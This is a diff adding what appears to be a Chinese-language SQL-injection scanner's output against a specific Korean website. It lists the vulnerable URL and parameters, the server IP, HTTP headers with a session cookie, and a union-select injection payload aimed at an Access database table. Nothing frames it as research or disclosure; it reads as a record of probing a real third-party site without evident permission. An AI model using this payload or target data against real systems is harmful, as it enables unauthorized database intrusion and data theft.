@@ -1,0 +1,27 @@
+■漏洞信息:============================================================
+ ·URL:http://www.telcoin.com/gifticon/notice/eventView5.jsp?companyId=99&nowPage=1&nId=378
+ ·页面标题：TELCOIN-扁橇萍能
+ ·参数:companyId=99&nowPage=1&nId=378
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:jsp
+ ·IP:211.62.254.152
+ ·数据库:未知
+ ·HEAD:
+HTTP/1.1 200 OK
+Date: Thu, 05 May 2011 15:59:20 GMT
+Server: Apache
+Cache-Control: private
+Set-Cookie: JSESSIONID=ax-PY-sMNnffJbO4a-; path=/
+P3P: CP='ALL CURa ADMa DEVa TAIa OUR BUS IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC OTC'
+Connection: close
+Content-Type: text/html;charset=euc-kr
+
+
+
+■数据库信息:============================================================
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+服务器未返回错误信息或返回不可识别的错误信息，你可以根据显示的错误详情设置错误关键字再试，或者切换到使用服务器转发的方式来读取信息！
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
